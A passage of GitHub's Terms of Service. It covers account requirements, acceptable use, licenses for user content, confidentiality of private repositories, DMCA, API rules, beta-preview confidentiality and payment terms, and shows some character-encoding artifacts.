8. The âWebsiteâ refers to GitHubâs website located at [github.com](https://github.com/), and all content, services, and products provided by GitHub at or through the Website. It also refers to GitHub-owned subdomains of github.com, such as [education.github.com](https://education.github.com/) and [pages.github.com](https://pages.github.com/). These Terms also govern GitHubâs conference websites, such as [githubuniverse.com](https://githubuniverse.com/), and product websites, such as [electronjs.org](https://www.electronjs.org/). Occasionally, websites owned by GitHub may provide different or additional terms of service. If those additional terms conflict with this Agreement, the more specific terms apply to the relevant page or service.

## [B. Account Terms](#b-account-terms)

**Short version:** *Personal Accounts and Organizations have different administrative controls; a human must create your Account; you must be 13 or over; you must provide a valid email address; and you may not have more than one free Account. You alone are responsible for your Account and anything that happens while you are signed in to or using your Account. You are responsible for keeping your Account secure.*

### [1. Account Controls](#1-account-controls)

* Users. Subject to these Terms, you retain ultimate administrative control over your Personal Account and the Content within it.
* Organizations. The "owner" of an Organization that was created under these Terms has ultimate administrative control over that Organization and the Content within it. Within the Service, an owner can manage User access to the Organizationâs data and projects. An Organization may have multiple owners, but there must be at least one Personal Account designated as an owner of an Organization. If you are the owner of an Organization under these Terms, we consider you responsible for the actions that are performed on or through that Organization.

### [2. Required Information](#2-required-information)

You must provide a valid email address in order to complete the signup process. Any other information requested, such as your real name, is optional, unless you are accepting these terms on behalf of a legal entity (in which case we need more information about the legal entity) or if you opt for a [paid Account](#k-payment), in which case additional information will be necessary for billing purposes.

### [3. Account Requirements](#3-account-requirements)

We have a few simple rules for Personal Accounts on GitHub's Service.

* You must be a human to create an Account. Accounts registered by "bots" or other automated methods are not permitted. We do permit machine accounts:
* A machine account is an Account set up by an individual human who accepts the Terms on behalf of the Account, provides a valid email address, and is responsible for its actions. A machine account is used exclusively for performing automated tasks. Multiple users may direct the actions of a machine account, but the owner of the Account is ultimately responsible for the machine's actions. You may maintain no more than one free machine account in addition to your free Personal Account.
* One person or legal entity may maintain no more than one free Account (if you choose to control a machine account as well, that's fine, but it can only be used for running a machine).
* You must be age 13 or older. While we are thrilled to see brilliant young coders get excited by learning to program, we must comply with United States law. GitHub does not target our Service to children under 13, and we do not permit any Users under 13 on our Service. If we learn of any User under the age of 13, we will [terminate that Userâs Account immediately](#l-cancellation-and-termination). If you are a resident of a country outside the United States, your countryâs minimum age may be older; in such a case, you are responsible for complying with your countryâs laws.
* Your login may only be used by one person â i.e., a single login may not be shared by multiple people. A paid Organization may only provide access to as many Personal Accounts as your subscription allows.
* You may not use GitHub in violation of export control or sanctions laws of the United States or any other applicable jurisdiction. You may not use GitHub if you are or are working on behalf of a [Specially Designated National (SDN)](https://www.treasury.gov/resource-center/sanctions/SDN-List/Pages/default.aspx) or a person subject to similar blocking or denied party prohibitions administered by a U.S. government agency. GitHub may allow persons in certain sanctioned countries or territories to access certain GitHub services pursuant to U.S. government authorizations. For more information, please see our [Export Controls policy](/en/site-policy/other-site-policies/github-and-trade-controls).

### [4. Account Security](#4-account-security)

You are responsible for keeping your Account secure while you use our Service. We offer tools such as two-factor authentication to help you maintain your Account's security, but the content of your Account and its security are up to you.

* You are responsible for all content posted and activity that occurs under your Account (even when content is posted by others who have Accounts under your Account).
* You are responsible for maintaining the security of your Account and password. GitHub cannot and will not be liable for any loss or damage from your failure to comply with this security obligation.
* You will promptly notify GitHub by contacting us through the [GitHub Support portal](https://support.github.com/) if you become aware of any unauthorized use of, or access to, our Service through your Account, including any unauthorized use of your password or Account.

### [5. Additional Terms](#5-additional-terms)

In some situations, third parties' terms may apply to your use of GitHub. For example, you may be a member of an organization on GitHub with its own terms or license agreements; you may download an application that integrates with GitHub; or you may use GitHub to authenticate to another service. Please be aware that while these Terms are our full agreement with you, other parties' terms govern their relationships with you.

If you are a government User or otherwise accessing or using any GitHub Service in a government capacity, this [Government Amendment to GitHub Terms of Service](/en/site-policy/site-policy-deprecated/amendment-to-github-terms-of-service-applicable-to-us-federal-government-users) applies to you, and you agree to its provisions.

If you have signed up for GitHub Enterprise Cloud, the [Enterprise Cloud Addendum](/en/site-policy/site-policy-deprecated/github-enterprise-service-level-agreement) applies to you, and you agree to its provisions.

## [C. Acceptable Use](#c-acceptable-use)

**Short version:** *GitHub hosts a wide variety of collaborative projects from all over the world, and that collaboration only works when our users are able to work together in good faith. While using the service, you must follow the terms of this section, which include some restrictions on content you can post, conduct on the service, and other limitations. In short, be excellent to each other.*

Your use of the Website and Service must not violate any applicable laws, including copyright or trademark laws, export control or sanctions laws, or other laws in your jurisdiction. You are responsible for making sure that your use of the Service is in compliance with laws and any applicable regulations.

You agree that you will not under any circumstances violate our [Acceptable Use Policies](/en/site-policy/acceptable-use-policies/github-acceptable-use-policies) or [Community Guidelines](/en/site-policy/github-terms/github-community-guidelines).

## [D. User-Generated Content](#d-user-generated-content)

**Short version:** *You own content you create, but you allow us certain rights to it, so that we can display and share the content you post. You still have control over your content, and responsibility for it, and the rights you grant us are limited to those we need to provide the service. We have the right to remove content or close Accounts if we need to.*

### [1. Responsibility for User-Generated Content](#1-responsibility-for-user-generated-content)

You may create or upload User-Generated Content while using the Service. You are solely responsible for the content of, and for any harm resulting from, any User-Generated Content that you post, upload, link to or otherwise make available via the Service, regardless of the form of that Content. We are not responsible for any public display or misuse of your User-Generated Content.

### [2. GitHub May Remove Content](#2-github-may-remove-content)

We have the right to refuse or remove any User-Generated Content that, in our sole discretion, violates any laws or [GitHub terms or policies](/en/site-policy). User-Generated Content displayed on GitHub Mobile may be subject to mobile app stores' additional terms.

### [3. Ownership of Content, Right to Post, and License Grants](#3-ownership-of-content-right-to-post-and-license-grants)

You retain ownership of and responsibility for Your Content. If you're posting anything you did not create yourself or do not own the rights to, you agree that you are responsible for any Content you post; that you will only submit Content that you have the right to post; and that you will fully comply with any third party licenses relating to Content you post.

Because you retain ownership of and responsibility for Your Content, we need you to grant us â and other GitHub Users â certain legal permissions, listed in Sections D.4 â D.7. These license grants apply to Your Content. If you upload Content that already comes with a license granting GitHub the permissions we need to run our Service, no additional license is required. You understand that you will not receive any payment for any of the rights granted in Sections D.4 â D.7. The licenses you grant to us will end when you remove Your Content from our servers, unless other Users have forked it.

### [4. License Grant to Us](#4-license-grant-to-us)

We need the legal right to do things like host Your Content, publish it, and share it. You grant us and our legal successors the right to store, archive, parse, and display Your Content, and make incidental copies, as necessary to provide the Service, including improving the Service over time. This license includes the right to do things like copy it to our database and make backups; show it to you and other users; parse it into a search index or otherwise analyze it on our servers; share it with other users; and perform it, in case Your Content is something like music or video.

This license does not grant GitHub the right to sell Your Content. It also does not grant GitHub the right to otherwise distribute or use Your Content outside of our provision of the Service, except that as part of the right to archive Your Content, GitHub may permit our partners to store and archive Your Content in public repositories in connection with the [GitHub Arctic Code Vault and GitHub Archive Program](https://archiveprogram.github.com/).

### [5. License Grant to Other Users](#5-license-grant-to-other-users)

Any User-Generated Content you post publicly, including issues, comments, and contributions to other Users' repositories, may be viewed by others. By setting your repositories to be viewed publicly, you agree to allow others to view and "fork" your repositories (this means that others may make their own copies of Content from your repositories in repositories they control).

If you set your pages and repositories to be viewed publicly, you grant each User of GitHub a nonexclusive, worldwide license to use, display, and perform Your Content through the GitHub Service and to reproduce Your Content solely on GitHub as permitted through GitHub's functionality (for example, through forking). You may grant further rights if you [adopt a license](/en/communities/setting-up-your-project-for-healthy-contributions/adding-a-license-to-a-repository#including-an-open-source-license-in-your-repository). If you are uploading Content you did not create or own, you are responsible for ensuring that the Content you upload is licensed under terms that grant these permissions to other GitHub Users.

### [6. Contributions Under Repository License](#6-contributions-under-repository-license)

Whenever you add Content to a repository containing notice of a license, you license that Content under the same terms, and you agree that you have the right to license that Content under those terms. If you have a separate agreement to license that Content under different terms, such as a contributor license agreement, that agreement will supersede.

Isn't this just how it works already? Yep. This is widely accepted as the norm in the open-source community; it's commonly referred to by the shorthand "inbound=outbound". We're just making it explicit.

### [7. Moral Rights](#7-moral-rights)

You retain all moral rights to Your Content that you upload, publish, or submit to any part of the Service, including the rights of integrity and attribution. However, you waive these rights and agree not to assert them against us, to enable us to reasonably exercise the rights granted in Section D.4, but not otherwise.

To the extent this agreement is not enforceable by applicable law, you grant GitHub the rights we need to use Your Content without attribution and to make reasonable adaptations of Your Content as necessary to render the Website and provide the Service.

## [E. Private Repositories](#e-private-repositories)

**Short version:** *We treat the content of private repositories as confidential, and we only access it as described in our Privacy Statementâfor security purposes, to assist the repository owner with a support matter, to maintain the integrity of the Service, to comply with our legal obligations, if we have reason to believe the contents are in violation of the law, or with your consent.*

### [1. Control of Private Repositories](#1-control-of-private-repositories)

Some Accounts may have private repositories, which allow the User to control access to Content.

### [2. Confidentiality of Private Repositories](#2-confidentiality-of-private-repositories)

GitHub considers the contents of private repositories to be confidential to you. GitHub will protect the contents of private repositories from unauthorized use, access, or disclosure in the same manner that we would use to protect our own confidential information of a similar nature and in no event with less than a reasonable degree of care.

### [3. Access](#3-access)

GitHub personnel may only access the content of your private repositories in the situations described in our [Privacy Statement](/en/site-policy/privacy-policies/github-privacy-statement#repository-contents).

You may choose to enable additional access to your private repositories. For example:

* You may enable various GitHub services or features that require additional rights to Your Content in private repositories. These rights may vary depending on the service or feature, but GitHub will continue to treat your private repository Content as confidential. If those services or features require rights in addition to those we need to provide the GitHub Service, we will provide an explanation of those rights.

Additionally, we may be [compelled by law](/en/site-policy/privacy-policies/github-privacy-statement#for-legal-disclosure) to disclose the contents of your private repositories.

GitHub will provide notice regarding our access to private repository content, unless [for legal disclosure](/en/site-policy/privacy-policies/github-privacy-statement#for-legal-disclosure), to comply with our legal obligations, or where otherwise bound by requirements under law, for automated scanning, or if in response to a security threat or other risk to security.

## [F. Copyright Infringement and DMCA Policy](#f-copyright-infringement-and-dmca-policy)

If you believe that content on our website violates your copyright, please contact us in accordance with our [Digital Millennium Copyright Act Policy](/en/site-policy/content-removal-policies/dmca-takedown-policy). If you are a copyright owner and you believe that content on GitHub violates your rights, please contact us via [our convenient DMCA form](https://github.com/contact/dmca) or by emailing copyright@github.com. There may be legal consequences for sending a false or frivolous takedown notice. Before sending a takedown request, you must consider legal uses such as fair use and licensed uses.

We will terminate the Accounts of [repeat infringers](/en/site-policy/content-removal-policies/dmca-takedown-policy#e-repeated-infringement) of this policy.

## [G. Intellectual Property Notice](#g-intellectual-property-notice)

**Short version:** *We own the service and all of our content. In order for you to use our content, we give you certain rights to it, but you may only use our content in the way we have allowed.*

### [1. GitHub's Rights to Content](#1-githubs-rights-to-content)

GitHub and our licensors, vendors, agents, and/or our content providers retain ownership of all intellectual property rights of any kind related to the Website and Service. We reserve all rights that are not expressly granted to you under this Agreement or by law. The look and feel of the Website and Service is copyright Â© GitHub, Inc. All rights reserved. You may not duplicate, copy, or reuse any portion of the HTML/CSS, JavaScript, or visual design elements or concepts without express written permission from GitHub.

### [2. GitHub Trademarks and Logos](#2-github-trademarks-and-logos)

If youâd like to use GitHubâs trademarks, you must follow all of our trademark guidelines, including those on our logos page: <https://github.com/logos>.

### [3. License to GitHub Policies](#3-license-to-github-policies)

This Agreement is licensed under this [Creative Commons Zero license](https://creativecommons.org/publicdomain/zero/1.0/). For details, see our [site-policy repository](https://github.com/github/site-policy#license).

## [H. API Terms](#h-api-terms)

**Short version:** *You agree to these Terms of Service, plus this Section H, when using any of GitHub's APIs (Application Provider Interface), including use of the API through a third party product that accesses GitHub.*

Abuse or excessively frequent requests to GitHub via the API may result in the temporary or permanent suspension of your Account's access to the API. GitHub, in our sole discretion, will determine abuse or excessive usage of the API. We will make a reasonable attempt to warn you via email prior to suspension.

You may not share API tokens to exceed GitHub's rate limitations.

You may not use the API to download data or Content from GitHub for spamming purposes, including for the purposes of selling GitHub users' personal information, such as to recruiters, headhunters, and job boards.

All use of the GitHub API is subject to these Terms of Service and the [GitHub Privacy Statement](https://github.com/site/privacy).

GitHub may offer subscription-based access to our API for those Users who require high-throughput access or access that would result in resale of GitHub's Service.

## [I. GitHub Additional Product Terms](#i-github-additional-product-terms)

**Short version:** *You need to follow certain specific terms and conditions for GitHub's various features and products, and you agree to the Supplemental Terms and Conditions when you agree to this Agreement.*

Some Service features may be subject to additional terms specific to that feature or product as set forth in the GitHub Additional Product Terms. By accessing or using the Services, you also agree to the [GitHub Additional Product Terms](/en/site-policy/github-terms/github-terms-for-additional-products-and-features).

## [J. Beta Previews](#j-beta-previews)

**Short version:** *Beta Previews may not be supported or may change at any time. You may receive confidential information through those programs that must remain confidential while the program is private. We'd love your feedback to make our Beta Previews better.*

### [1. Subject to Change](#1-subject-to-change)

Beta Previews may not be supported and may be changed at any time without notice. In addition, Beta Previews are not subject to the same security measures and auditing to which the Service has been and is subject. **By using a Beta Preview, you use it at your own risk.**

### [2. Confidentiality](#2-confidentiality)

As a user of Beta Previews, you may get access to special information that isnât available to the rest of the world. Due to the sensitive nature of this information, itâs important for us to make sure that you keep that information secret.

**Confidentiality Obligations.** You agree that any non-public Beta Preview information we give you, such as information about a private Beta Preview, will be considered GitHubâs confidential information (collectively, âConfidential Informationâ), regardless of whether it is marked or identified as such. You agree to only use such Confidential Information for the express purpose of testing and evaluating the Beta Preview (the âPurposeâ), and not for any other purpose. You should use the same degree of care as you would with your own confidential information, but no less than reasonable precautions to prevent any unauthorized use, disclosure, publication, or dissemination of our Confidential Information. You promise not to disclose, publish, or disseminate any Confidential Information to any third party, unless we donât otherwise prohibit or restrict such disclosure (for example, you might be part of a GitHub-organized group discussion about a private Beta Preview feature).

**Exceptions.** Confidential Information will not include information that is: (a) or becomes publicly available without breach of this Agreement through no act or inaction on your part (such as when a private Beta Preview becomes a public Beta Preview); (b) known to you before we disclose it to you; (c) independently developed by you without breach of any confidentiality obligation to us or any third party; or (d) disclosed with permission from GitHub. You will not violate the terms of this Agreement if you are required to disclose Confidential Information pursuant to operation of law, provided GitHub has been given reasonable advance written notice to object, unless prohibited by law.

### [3. Feedback](#3-feedback)

Weâre always trying to improve of products and services, and your feedback as a Beta Preview user will help us do that. If you choose to give us any ideas, know-how, algorithms, code contributions, suggestions, enhancement requests, recommendations or any other feedback for our products or services (collectively, âFeedbackâ), you acknowledge and agree that GitHub will have a royalty-free, fully paid-up, worldwide, transferable, sub-licensable, irrevocable and perpetual license to implement, use, modify, commercially exploit and/or incorporate the Feedback into our products, services, and documentation.

## [K. Payment](#k-payment)

**Short version:** *You are responsible for any fees associated with your use of GitHub. We are responsible for communicating those fees to you clearly and accurately, and letting you know well in advance if those prices change.*

### [1. Pricing](#1-pricing)

Our pricing and payment terms are available at [github.com/pricing](https://github.com/pricing). If you agree to a subscription price, that will remain your price for the duration of the payment term; however, prices are subject to change at the end of a payment term.

### [2. Upgrades, Downgrades, and Changes](#2-upgrades-downgrades-and-changes)

* We will immediately bill you when you upgrade from the free plan to any paying plan.
* If you change from a monthly billing plan to a yearly billing plan, GitHub will bill you for a full year at the next monthly billing date.
* If you upgrade to a higher level of service, we will bill you for the upgraded plan immediately.
* You may change your level of service at any time by [choosing a plan option](https://github.com/pricing) or going into your [Billing settings](https://github.com/settings/billing). If you choose to downgrade your Account, you may lose access to Content, features, or capacity of your Account. Please see our section on [Cancellation](#l-cancellation-and-termination) for information on getting a copy of that Content.

### [3. Billing Schedule; No Refunds](#3-billing-schedule-no-refunds)

**Payment Based on Plan** For monthly or yearly payment plans, the Service is billed in advance on a monthly or yearly basis respectively and is non-refundable. There will be no refunds or credits for partial months of service, downgrade refunds, or refunds for months unused with an open Account; however, the service will remain active for the length of the paid billing period. In order to treat everyone equally, no exceptions will be made.

**Payment Based on Usage** Some Service features are billed based on your usage. A limited quantity of these Service features may be included in your plan for a limited term without additional charge. If you choose to use paid Service features beyond the quantity included in your plan, you pay for those Service features based on your actual usage in the preceding month. Monthly payment for these purchases will be charged on a periodic basis in arrears. See [GitHub Additional Product Terms for Details](/en/site-policy/github-terms/github-terms-for-additional-products-and-features).

**Invoicing** For invoiced Users, User agrees to pay the fees in full, up front without deduction or setoff of any kind, in U.S. Dollars. User must pay the fees within thirty (30) days of the GitHub invoice date. Amounts payable under this Agreement are non-refundable, except as otherwise provided in this Agreement. If User fails to pay any fees on time, GitHub reserves the right, in addition to taking any other action at law or equity, to (i) charge interest on past due amounts at 1.0% per month or the highest interest rate allowed by law, whichever is less, and to charge all expenses of recovery, and (ii) terminate the applicable order form. User is solely responsible for all taxes, fees, duties and governmental assessments (except for taxes based on GitHub's net income) that are imposed or become due in connection with this Agreement.

### [4. Authorization](#4-authorization)

By agreeing to these Terms, you are giving us permission to charge your on-file credit card, PayPal account, or other approved methods of payment for fees that you authorize for GitHub.

### [5. Responsibility for Payment](#5-responsibility-for-payment)

You are responsible for all fees, including taxes, associated with your use of the Service. By using the Service, you agree to pay GitHub any charge incurred in connection with your use of the Service.

Free Accounts are not required to provide payment information.

We will not delete Content that you have contributed to other Users' repositories or that other Users have forked.
